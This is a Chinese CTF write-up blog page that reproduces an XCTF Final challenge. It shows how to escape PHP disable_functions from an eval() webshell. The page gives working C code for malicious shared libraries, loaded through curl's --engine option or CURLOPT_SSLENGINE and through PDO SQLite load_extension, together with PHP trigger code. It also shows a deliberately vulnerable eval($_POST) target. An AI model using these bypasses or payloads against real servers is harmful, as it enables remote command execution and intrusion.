@@ -1,0 +1,1067 @@
+<!DOCTYPE html>
+<html lang="en-us" dir="ltr">
+    <head><meta charset='utf-8'>
+<meta name='viewport' content='width=device-width, initial-scale=1'><meta name='description' content="一道XCTF Final的题目，心血来潮复现一下">
+<title>恶意so加载(花活)</title>
+
+<link rel='canonical' href='https://xxxxctfer.github.io/p/%E6%81%B6%E6%84%8Fso%E5%8A%A0%E8%BD%BD%E8%8A%B1%E6%B4%BB/'>
+
+<link rel="stylesheet" href="/scss/style.min.1ae76ab9aa3beab52f99d9b5f59d64d06778453e93ff523a98332d15179df142.css"><meta property='og:title' content="恶意so加载(花活)">
+<meta property='og:description' content="一道XCTF Final的题目，心血来潮复现一下">
+<meta property='og:url' content='https://xxxxctfer.github.io/p/%E6%81%B6%E6%84%8Fso%E5%8A%A0%E8%BD%BD%E8%8A%B1%E6%B4%BB/'>
+<meta property='og:site_name' content='xxxx'>
+<meta property='og:type' content='article'><meta property='article:section' content='Post' /><meta property='article:published_time' content='2026-03-11T00:00:00&#43;00:00'/><meta property='article:modified_time' content='2026-03-11T00:00:00&#43;00:00'/><meta property='og:image' content='https://xxxxctfer.github.io/images/CTF/so/so1.png' />
+<meta name="twitter:title" content="恶意so加载(花活)">
+<meta name="twitter:description" content="一道XCTF Final的题目，心血来潮复现一下"><meta name="twitter:card" content="summary_large_image">
+    <meta name="twitter:image" content='https://xxxxctfer.github.io/images/CTF/so/so1.png' />
+    <link rel="shortcut icon" href="/favicon.ico" />
+
+    </head>
+    <body class="
+    article-page
+    ">
+    <script>
+        (function() {
+            const colorSchemeKey = 'StackColorScheme';
+            if(!localStorage.getItem(colorSchemeKey)){
+                localStorage.setItem(colorSchemeKey, "auto");
+            }
+        })();
+    </script><script>
+    (function() {
+        const colorSchemeKey = 'StackColorScheme';
+        const colorSchemeItem = localStorage.getItem(colorSchemeKey);
+        const supportDarkMode = window.matchMedia('(prefers-color-scheme: dark)').matches === true;
+
+        if (colorSchemeItem == 'dark' || colorSchemeItem === 'auto' && supportDarkMode) {
+            
+
+            document.documentElement.dataset.scheme = 'dark';
+        } else {
+            document.documentElement.dataset.scheme = 'light';
+        }
+    })();
+</script>
+<div class="container main-container flex on-phone--column extended"><aside class="sidebar left-sidebar sticky ">
+    <button class="hamburger hamburger--spin" type="button" id="toggle-menu" aria-label="切换菜单">
+        <span class="hamburger-box">
+            <span class="hamburger-inner"></span>
+        </span>
+    </button>
+
+    <header>
+        
+            
+            <figure class="site-avatar">
+                <a href="/">
+                
+                    
+                    
+                    
+                        
+                        <img src="/img/avatar_hu_a014c1f4876185e.png" width="300"
+                            height="300" class="site-logo" loading="lazy" alt="Avatar">
+                    
+                
+                </a>
+                
+                    <span class="emoji">🥰</span>
+                
+            </figure>
+            
+        
+        
+        <div class="site-meta">
+            <h1 class="site-name"><a href="/">xxxx</a></h1>
+            <h2 class="site-description">一个还在努力的xxxx</h2>
+        </div>
+    </header><ol class="menu-social">
+            
+                <li>
+                    <a 
+                        href='https://github.com/xxxxctfer'
+                        target="_blank"
+                        title="GitHub"
+                        rel="me"
+                    >
+                        
+                        
+                            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-brand-github" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z" fill="none"/>
+  <path d="M9 19c-4.3 1.4 -4.3 -2.5 -6 -3m12 5v-3.5c0 -1 .1 -1.4 -.5 -2c2.8 -.3 5.5 -1.4 5.5 -6a4.6 4.6 0 0 0 -1.3 -3.2a4.2 4.2 0 0 0 -.1 -3.2s-1.1 -.3 -3.5 1.3a12.3 12.3 0 0 0 -6.2 0c-2.4 -1.6 -3.5 -1.3 -3.5 -1.3a4.2 4.2 0 0 0 -.1 3.2a4.6 4.6 0 0 0 -1.3 3.2c0 4.6 2.7 5.7 5.5 6c-.6 .6 -.6 1.2 -.5 2v3.5" />
+</svg>
+
+
+
+                        
+                    </a>
+                </li>
+            
+        </ol><ol class="menu" id="main-menu">
+        
+        
+        
+        <li >
+            <a href='/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-home" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <polyline points="5 12 3 12 12 3 21 12 19 12" />
+  <path d="M5 12v7a2 2 0 0 0 2 2h10a2 2 0 0 0 2 -2v-7" />
+  <path d="M9 21v-6a2 2 0 0 1 2 -2h2a2 2 0 0 1 2 2v6" />
+</svg>
+
+
+
+                
+                <span>主页</span>
+            </a>
+        </li>
+        
+        
+        <li >
+            <a href='/%E5%85%B3%E4%BA%8E/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-user" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="12" cy="7" r="4" />
+  <path d="M6 21v-2a4 4 0 0 1 4 -4h4a4 4 0 0 1 4 4v2" />
+</svg>
+
+
+
+                
+                <span>关于</span>
+            </a>
+        </li>
+        
+        
+        <li >
+            <a href='/archives/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-archive" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <rect x="3" y="4" width="18" height="4" rx="2" />
+  <path d="M5 8v10a2 2 0 0 0 2 2h10a2 2 0 0 0 2 -2v-10" />
+  <line x1="10" y1="12" x2="14" y2="12" />
+</svg>
+
+
+
+                
+                <span>归档</span>
+            </a>
+        </li>
+        
+        
+        <li >
+            <a href='/search/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-search" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="10" cy="10" r="7" />
+  <line x1="21" y1="21" x2="15" y2="15" />
+</svg>
+
+
+
+                
+                <span>搜索</span>
+            </a>
+        </li>
+        
+        
+        <li >
+            <a href='/%E5%8F%8B%E9%93%BE/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-link" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <path d="M10 14a3.5 3.5 0 0 0 5 0l4 -4a3.5 3.5 0 0 0 -5 -5l-.5 .5" />
+  <path d="M14 10a3.5 3.5 0 0 0 -5 0l-4 4a3.5 3.5 0 0 0 5 5l.5 -.5" />
+</svg>
+
+
+
+                
+                <span>友链</span>
+            </a>
+        </li>
+        
+        <li class="menu-bottom-section">
+            <ol class="menu">
+
+                
+                    <li id="dark-mode-toggle">
+                        <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-toggle-left" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="8" cy="12" r="2" />
+  <rect x="2" y="6" width="20" height="12" rx="6" />
+</svg>
+
+
+
+                        <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-toggle-right" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="16" cy="12" r="2" />
+  <rect x="2" y="6" width="20" height="12" rx="6" />
+</svg>
+
+
+
+                        <span>暗色模式</span>
+                    </li>
+                
+            </ol>
+        </li>
+    </ol>
+</aside>
+
+    
+
+            <main class="main full-width">
+    <article class="has-image main-article">
+    <header class="article-header">
+        <div class="article-image">
+            <a href="/p/%E6%81%B6%E6%84%8Fso%E5%8A%A0%E8%BD%BD%E8%8A%B1%E6%B4%BB/">
+                
+                    <img src="/images/CTF/so/so1.png" loading="lazy" alt="Featured image of post 恶意so加载(花活)" />
+                
+            </a>
+        </div>
+    
+
+    <div class="article-details">
+    
+    <header class="article-category">
+        
+            <a href="/categories/web%E4%BA%BA/" >
+                Web人
+            </a>
+        
+    </header>
+    
+
+    <div class="article-title-wrapper">
+        <h2 class="article-title">
+            <a href="/p/%E6%81%B6%E6%84%8Fso%E5%8A%A0%E8%BD%BD%E8%8A%B1%E6%B4%BB/">恶意so加载(花活)</a>
+        </h2>
+    
+        
+        <h3 class="article-subtitle">
+            一道XCTF Final的题目，心血来潮复现一下
+        </h3>
+        
+    </div>
+
+    
+    
+    
+    
+    <footer class="article-time">
+        
+            <div>
+                <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-calendar-time" width="56" height="56" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <path d="M11.795 21h-6.795a2 2 0 0 1 -2 -2v-12a2 2 0 0 1 2 -2h12a2 2 0 0 1 2 2v4" />
+  <circle cx="18" cy="18" r="4" />
+  <path d="M15 3v4" />
+  <path d="M7 3v4" />
+  <path d="M3 11h16" />
+  <path d="M18 16.496v1.504l1 1" />
+</svg>
+                <time class="article-time--published" datetime='2026-03-11T00:00:00Z'>2026-03-11</time>
+            </div>
+        
+
+        
+    </footer>
+    
+
+    
+</div>
+
+</header>
+
+    <section class="article-content">
+    
+    
+    <p>这个题目原题是XCTF 9th final的一个题目，我本地没有直接起docker配置，而是现在在本地测试一下，测试成功了之后我再看看有没有docker可以试验一下。
+<img src="/images/CTF/so/so1.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="示例"
+	
+	
+>
+可以看到写的一个有rce漏洞的代码啊。</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
+</span></span><span class="line"><span class="cl"><span class="nx">highlight_file</span><span class="p">(</span><span class="no">__FILE__</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="o">@</span><span class="k">eval</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;xxxx&#39;</span><span class="p">]);</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>然后测试phpinfo是没问题的，可以打开，说明确实存在漏洞，然后我们看一下disable_function和open_basedir。原题目这里都有限制，并且限制的非常多。disable_function基本上都限制了，opne_basedir限制了/tmp的一个目录。
+而且PHP的版本也很高，是8.4.14的，我本地最高修改到8.2.9了。调整了一下，但是还是没接近。我上网查了一下，变化不太大，至少在这个题目环境里面。所以我们就弄一下吧。
+先查一下disable_function和open_basedir。
+<img src="/images/CTF/so/so2.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="示例"
+	
+	
+></p>
+<p><img src="/images/CTF/so/so3.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="示例"
+	
+	
+>
+虽然这里是Windows环境啊，应该区别，不大吧。(doge
+然后我们蚁剑连接一下试试，这里发现我的蚁剑连不上，因为测试连接到时候会用到被disable_function的一些函数，导致认为无法启动，貌似说别的可以自定义测试payload，这里我也没管了，反正主要是看怎么绕过。
+这里我修改了一下原题吧，因为是有一开始的题目和复仇题，先做开始题目的预期解，是因为里面没有限制curl的操作。</p>
+<h1 id="有curl命令">有curl命令
+</h1><p>curl命令有一个比较特殊的机制就是可以用curl去实现任意共享库加载。什么意思呢，栏看一下下面这个命令的解析。
+<img src="/images/CTF/so/so4.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="示例"
+	
+	
+>
+很明显可以看到通过&ndash;engine的一个参数，去加载了一个动态链接库，而且这个加载方式不需要命令有效，命令没有执行正确也会进行加载，从而导致任意执行。我们这里就来写一个C语言恶意代码先。</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-C" data-lang="C"><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;stdlib.h&gt;</span><span class="cp">
+</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;stdio.h&gt;</span><span class="cp">
+</span></span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nf">__attribute__</span><span class="p">((</span><span class="n">constructor</span><span class="p">))</span> <span class="k">static</span> <span class="kt">void</span> <span class="nf">rce_init</span><span class="p">(</span><span class="kt">void</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="nf">system</span><span class="p">(</span><span class="s">&#34;ls / &gt; /tmp/1&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>大概就是这个样子，但是这个是Linux的，我们本地是Windows的，我们这里还是不在主机上面霍霍了，开个虚拟机实践一下。
+这里先打下面的命令。</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">gcc -fPIC -shared -o 1.so 1.c
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>然后就成功生成了恶意so文件，然后我们打curl命令。</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">curl --engine <span class="k">$(</span><span class="nb">pwd</span><span class="k">)</span>/1.so https://example.com
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><img src="/images/CTF/so/so5.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="示例"
+	
+	
+>
+在执行之后很明显出现了一个1.txt，这个是因为我kali里面打的命令是cat flag &gt; 1.txt的原因，打开就可以看到我们抓到的flag。可以看到虽然curl命令报错了，但是还是正确执行了。</p>
+<p>这个就是有curl的情况，但是问题来了，我们的web界面又不是bash。GCC编译可以本地搞，然后上传文件也可以打，因为没有被过滤文件写入相关的一些函数，但是我打不了curl命令，因为system之类的命令执行函数被禁了。</p>
+<p>所以这里就要用curl相关的函数了。eval是可以执行PHP代码的，所以我们去打curl相关的函数，实际上也可以执行curl命令，就也达到了我们的想法。</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span><span class="lnt">8
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$malicious_so_path</span> <span class="o">=</span> <span class="s1">&#39;/tmp/1.so&#39;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$ch</span> <span class="o">=</span> <span class="nx">curl_init</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl"><span class="nx">curl_setopt</span><span class="p">(</span><span class="nv">$ch</span><span class="p">,</span> <span class="nx">CURLOPT_URL</span><span class="p">,</span> <span class="s2">&#34;&lt;http://127.0.0.1&gt;&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="nx">curl_setopt</span><span class="p">(</span><span class="nv">$ch</span><span class="p">,</span> <span class="nx">CURLOPT_SSLENGINE</span><span class="p">,</span> <span class="nv">$malicious_so_path</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="nx">curl_setopt</span><span class="p">(</span><span class="nv">$ch</span><span class="p">,</span> <span class="nx">CURLOPT_RETURNTRANSFER</span><span class="p">,</span> <span class="k">true</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="nx">curl_exec</span><span class="p">(</span><span class="nv">$ch</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="nx">curl_close</span><span class="p">(</span><span class="nv">$ch</span><span class="p">);</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>我们可以在kali本地执行一遍。
+<img src="/images/CTF/so/so6.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="示例"
+	
+	
+>
+可以看到这种形式也是成功获得flag了，有curl的情况加载还是比较方便的。</p>
+<h1 id="无curl命令sqlite3扩展">无curl命令(sqlite3扩展)
+</h1><p>刚刚说过原题是有复仇题的，很明显就是讲curl命令相关的去掉了，也就是一开始截图显示的情况。那我们现在怎么打呢，其实打了前面的curl扩展之后应该有差不多的思路，就是要找类似的扩展，去打加载恶意so。</p>
+<p>首先先介绍一下sqlite3扩展加载so文件的机制。</p>
+<ul>
+<li><strong>SQLite3 扩展</strong> 允许用户加载外部共享库（<code>.so</code> / <code>.dll</code>）来注册自定义函数、聚合器、虚拟表等。</li>
+<li>PHP 提供了两种方式加载扩展：
+<ol>
+<li><code>SQLite3::loadExtension(string $shared_library)</code> —— 面向过程风格</li>
+<li><code>PDO::SQLite::loadExtension(string $shared_library)</code> —— PDO 风格</li>
+</ol>
+</li>
+</ul>
+<p>但是这么明显有可能存在漏洞的地方，不可能不做一点限制的，下面就是一些限制机制。</p>
+<ul>
+<li>PHP 配置项：<code>sqlite3.extension_dir</code>（仅对 <code>SQLite3</code> 类有效）</li>
+<li>SQLite 编译选项：<code>SQLITE_ENABLE_LOAD_EXTENSION</code>（必须开启）
+如果配置项被设置了不可写路径，并且SQLite编译也没打开，那基本上是不可能可以利用的，我们这里回到原题的话可以知道
+<img src="/images/CTF/so/so7.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="示例"
+	
+	
+>
+sqlite3.extension_dir为空，那就说明我们无法用sqlite3类进行加载，被限制麻了。但是我们刚刚是有两个东西的，还有一个PDO可以使用，并且很明显他不受这个的限制。</li>
+</ul>
+<p>原因：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-text" data-lang="text"><span class="line"><span class="cl">很明显，sqlite3.extension_dir是php对这个so加载的一个限制，所以隶属于php的sqlite3类(class)要遵守这个规则。
+</span></span><span class="line"><span class="cl">但是PDO不一样，他并不是经过php的，而是C语言的，他会直接去调用sqlite引擎，所以php的限制对它没有用，它会直接执行sqlite3_load_extension()
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>知道这个之后我们就可以写C语言攻击链路了。还有一些特殊的规则这里就不多说了，攻击链路如下：</p>
+<div class="table-wrapper"><table>
+  <thead>
+      <tr>
+          <th>步骤</th>
+          <th>操作</th>
+          <th>说明</th>
+      </tr>
+  </thead>
+  <tbody>
+      <tr>
+          <td>1</td>
+          <td>编写恶意 SQLite 扩展 .so</td>
+          <td>在扩展初始化时执行系统命令</td>
+      </tr>
+      <tr>
+          <td>2</td>
+          <td>将 <code>.so</code> 上传到可写路径</td>
+          <td>绕过 <code>extension_dir</code> 限制</td>
+      </tr>
+      <tr>
+          <td>3</td>
+          <td>使用 <code>PDO('sqlite::memory:')</code> 创建内存数据库</td>
+          <td>无需文件，避免权限问题</td>
+      </tr>
+      <tr>
+          <td>4</td>
+          <td>调用 <code>$pdo-&gt;sqliteCreateFunction()</code> 或直接 <code>loadExtension('绝对路径')</code></td>
+          <td>加载扩展</td>
+      </tr>
+      <tr>
+          <td>5</td>
+          <td>扩展自动执行 <code>sqlite3_extension_init()</code> 中的恶意代码</td>
+          <td>实现命令执行</td>
+      </tr>
+  </tbody>
+</table></div>
+<p>具体代码如下：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span><span class="lnt">33
+</span><span class="lnt">34
+</span><span class="lnt">35
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-cpp" data-lang="cpp"><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;sqlite3ext.h&gt;</span><span class="cp">
+</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;stdio.h&gt;</span><span class="cp">
+</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;stdlib.h&gt;</span><span class="cp">
+</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;string.h&gt;</span><span class="cp">
+</span></span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">SQLITE_EXTENSION_INIT1</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="cp">#ifdef _WIN32
+</span></span></span><span class="line"><span class="cl"><span class="kr">__declspec</span><span class="p">(</span><span class="n">dllexport</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="cp">#endif
+</span></span></span><span class="line"><span class="cl"><span class="kt">int</span> <span class="n">sqlite3_exploit_init</span><span class="p">(</span>
+</span></span><span class="line"><span class="cl">    <span class="n">sqlite3</span> <span class="o">*</span><span class="n">db</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">    <span class="kt">char</span> <span class="o">**</span><span class="n">pzErrMsg</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">    <span class="k">const</span> <span class="n">sqlite3_api_routines</span> <span class="o">*</span><span class="n">pApi</span>
+</span></span><span class="line"><span class="cl"><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="n">SQLITE_EXTENSION_INIT2</span><span class="p">(</span><span class="n">pApi</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="k">const</span> <span class="kt">char</span> <span class="o">*</span><span class="n">command_file_path</span> <span class="o">=</span> <span class="s">&#34;/tmp/1.txt&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="kt">char</span> <span class="n">command_buffer</span><span class="p">[</span><span class="mi">512</span><span class="p">]</span> <span class="o">=</span> <span class="p">{</span><span class="mi">0</span><span class="p">};</span>
+</span></span><span class="line"><span class="cl">    <span class="n">FILE</span> <span class="o">*</span><span class="n">file_handle</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="n">file_handle</span> <span class="o">=</span> <span class="n">fopen</span><span class="p">(</span><span class="n">command_file_path</span><span class="p">,</span> <span class="s">&#34;r&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="n">file_handle</span> <span class="o">==</span> <span class="nb">NULL</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="n">SQLITE_OK</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="n">fgets</span><span class="p">(</span><span class="n">command_buffer</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">command_buffer</span><span class="p">),</span> <span class="n">file_handle</span><span class="p">)</span> <span class="o">!=</span> <span class="nb">NULL</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="n">command_buffer</span><span class="p">[</span><span class="n">strcspn</span><span class="p">(</span><span class="n">command_buffer</span><span class="p">,</span> <span class="s">&#34;</span><span class="se">\r\n</span><span class="s">&#34;</span><span class="p">)]</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="p">(</span><span class="n">strlen</span><span class="p">(</span><span class="n">command_buffer</span><span class="p">)</span> <span class="o">&gt;</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">            <span class="n">system</span><span class="p">(</span><span class="n">command_buffer</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="p">}</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">    <span class="n">fclose</span><span class="p">(</span><span class="n">file_handle</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">SQLITE_OK</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>文件名要与函数名sqlite3_文件名_init中的文件名一致，不然会查找不到这个初始化函数。
+触发PHP代码。</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
+</span></span><span class="line"><span class="cl"><span class="k">try</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="nv">$pdo</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">PDO</span><span class="p">(</span><span class="s1">&#39;sqlite::memory:&#39;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="nv">$pdo</span><span class="o">-&gt;</span><span class="na">setAttribute</span><span class="p">(</span><span class="nx">PDO</span><span class="o">::</span><span class="na">ATTR_ERRMODE</span><span class="p">,</span> <span class="nx">PDO</span><span class="o">::</span><span class="na">ERRMODE_EXCEPTION</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="c1">// 关键：使用 PDO 加载扩展，绕过 extension_dir 限制
+</span></span></span><span class="line"><span class="cl">    <span class="nv">$pdo</span><span class="o">-&gt;</span><span class="na">sqliteCreateFunction</span><span class="p">(</span><span class="s1">&#39;load_extension&#39;</span><span class="p">,</span> <span class="k">null</span><span class="p">);</span> <span class="c1">// 某些版本需要前置调用（可省略）
+</span></span></span><span class="line"><span class="cl">    <span class="nv">$pdo</span><span class="o">-&gt;</span><span class="na">query</span><span class="p">(</span><span class="s2">&#34;SELECT load_extension(&#39;/tmp/exploit.so&#39;)&#34;</span><span class="p">);</span>  <span class="c1">// 触发加载
+</span></span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="k">echo</span> <span class="s2">&#34;扩展加载完成，命令应已执行</span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span> <span class="k">catch</span> <span class="p">(</span><span class="nx">Exception</span> <span class="nv">$e</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="k">echo</span> <span class="s2">&#34;Error: &#34;</span> <span class="o">.</span> <span class="nv">$e</span><span class="o">-&gt;</span><span class="na">getMessage</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="cp">?&gt;</span><span class="err">
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p>这里kali开了别的东西，不给打，所以我们回到题目来打。这里做的是PCTF的ezezeval。
+<a class="link" href="https://gz.imxbt.cn/games/33/challenges#1220-ezezeval"  target="_blank" rel="noopener"
+    >https://gz.imxbt.cn/games/33/challenges#1220-ezezeval</a></p>
